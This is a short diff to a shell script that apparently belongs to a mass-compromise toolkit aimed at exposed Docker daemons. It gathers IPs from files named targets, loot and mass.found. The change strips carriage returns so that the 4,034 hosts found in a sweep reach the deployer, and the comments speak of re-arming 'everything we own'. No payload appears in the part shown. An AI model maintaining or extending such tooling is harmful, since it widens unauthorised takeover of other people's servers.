@@ -71,10 +71,15 @@ NOW=$(date +%s)
 [ -n "${POOL:-}" ]   || { echo "dock: POOL unset"; exit 0; }
 
 HOSTS="$WORK/dockhosts.$$"
+# CR matters, and it cost us the whole sweep: mass.found can arrive with CRLF
+# (scp'd from the Windows box) and the strict IPv4 regex below then drops
+# "1.2.3.4\r" - so thousands of sweep-verified daemons sat in the queue and the
+# deployer never saw one row of it ("scanned 203" while mass.found held 4,034).
+# Strip CR before matching, same as publish.sh does for the kit itself.
 { cut -f3 "$WORK/targets.txt" 2>/dev/null || :
   cut -f3 "$WORK/loot.txt" 2>/dev/null || :
   cut -f1 "$WORK/mass.found" 2>/dev/null || :; } \
-    | grep -E '^[0-9]{1,3}(\.[0-9]{1,3}){3}$' | sort -u > "$HOSTS"
+    | tr -d '\r' | grep -E '^[0-9]{1,3}(\.[0-9]{1,3}){3}$' | sort -u > "$HOSTS"
 
 # Re-arm rows, built before the fresh queue so healing is never starved by the
 # cap. Everything we own, every run; plus the head of the rotating ledger.
